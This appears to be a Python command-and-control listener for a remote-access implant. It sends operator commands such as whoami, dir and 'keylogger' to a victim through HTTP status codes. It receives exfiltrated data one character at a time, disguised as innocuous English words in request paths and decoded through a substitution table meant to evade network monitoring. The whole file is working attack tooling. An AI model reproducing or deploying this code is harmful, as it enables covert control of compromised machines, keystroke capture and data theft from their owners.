from http.server import BaseHTTPRequestHandler, HTTPServer
import signal
import time

# ========change here==============
custom_ip = '' # Your IP Address For EX: 10.10.22.34
custom_port = 80 # Your Port: For Ex: 80
# ========change here==============



httpd = ""
result = ""

exfiltr_array = {
"empty" :" ",
"netherlands" :"!",
"days" :"#",
"money" :"$",
"waze" :"&",
"motorized" :"(",
"leftmotorized" :")",
"kick" :"*",
"top" :"+",
"hostname" :",",
"full" :"-",
"more" :".",
"anatomy" :"/",
"intelligence" :"0",
"reports" :"1",
"zvelo" :"2",
"partners" :"3",
"technologies" :"4",
"data" :"5",
"bins" :"6",
"web" :"7",
"collects" :"8",
"multiple" :"9",
"surge" :":",
"analysis" :";",
"sets" :"<",
"accuse" :"=",
"admire" :">",
"agency" :"?",
"airline" :"@",
"common" :"A",
"analyze" :"B",
"another" :"C",
"anywhere" :"D",
"appreciate" :"E",
"area" :"F",
"commercial" :"G",
"concentrate" :"H",
"confident" :"I",
"department" :"J",
"devote" :"K",
"discipline" :"L",
"display" :"M",
"preserve" :"N",
"privacy" :"O",
"production" :"P",
"promote" :"Q",
"protect" :"R",
"public" :"S",
"quietly" :"T",
"rare" :"U",
"rather" :"V",
"reason" :"W",
"refugee" :"X",
"represent" :"Y",
"romantic" :"Z",
"sand" :"[",
"scientist" :"]",
"senator" :"^",
"sharp" :"_",
"shrug" :"`",
"since" :"a",
"slowly" :"b",
"somewhere" :"c",
"speech" :"d",
"standard" :"e",
"stream" :"f",
"such" :"g",
"surgery" :"h",
"surprisingly" :"i",
"table" :"j",
"teaching" :"k",
"tension" :"l",
"testify" :"m",
"then" :"n",
"three" :"o",
"tobacco" :"p",
"tourist" :"q",
"training" :"r",
"trip" :"s",
"typically" :"t",
"unlikely" :"u",
"versus" :"v",
"vision" :"w",
"warning" :"x",
"west" :"y",
"whisper" :"z",
"winner" :"{",
"wrap" :"|",
"wrong" :"}",
"yours" :"~",
"hostel" :"\\",
}



command_array = {
    "dir" : 202,
    "whoami" : 203,
    "cd" : 204,
    "pwd" : 205,
    "keylogger": 206,
}

is_sended = False
global_command = ""

class S(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        global result
        global httpd
        global global_command
        global is_sended
    

        if self.path == "/first_supper":
            
            if(is_sended == False):
                self.send_response(int(command_array[global_command]))
                self.end_headers()
            else:
                self.send_response(200)
                self.end_headers()
            is_sended = True

        if self.path == "/last_supper":
            self.send_response(200)
            self.end_headers()
            
            self.wfile.write(bytes("page", "utf-8"))
            httpd.server_close()
            time.sleep(0.1)
            stop()
            command_listener()

        if self.path == "/hello":
            self.send_response(200)
            result = ""
            print(result)
            self.end_headers()

        if self.path[1:] in exfiltr_array:
            self.send_response(200)
            result += exfiltr_array[self.path[1:]]
            print("\r" + result, end='')
            self.end_headers()
        else:
            # self.send_response(200)
            # print(self.path[1:])
            pass
            # self.end_headers()
        

  

def command_listener():
    global result
    global global_command
    global is_sended
    
    while True:
        print("\n")
        command = input(">>>")

        if(str(command) == "exit"):
                exit(0)

        if command not in command_array:
            print("Incorrect command "+ str(command) +"\n\nCommands:\n  dir\n  pwd\n  whoami\n  keylogger\n  exit")
        else:
            
            is_sended = False
            result = ""
            global_command = str(command)
            print('Command runned ' + str(command))
            run()
       

def stop():
    global httpd
    if hasattr(httpd, 'server_close'):
        httpd.server_close()

def run(server_class=HTTPServer, handler_class=S):
    global httpd
    print("Listener Started\n")
    server_address = (custom_ip, custom_port)
    httpd = server_class(server_address, handler_class)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    
if __name__ == '__main__':
    
    # run()

    command_listener()
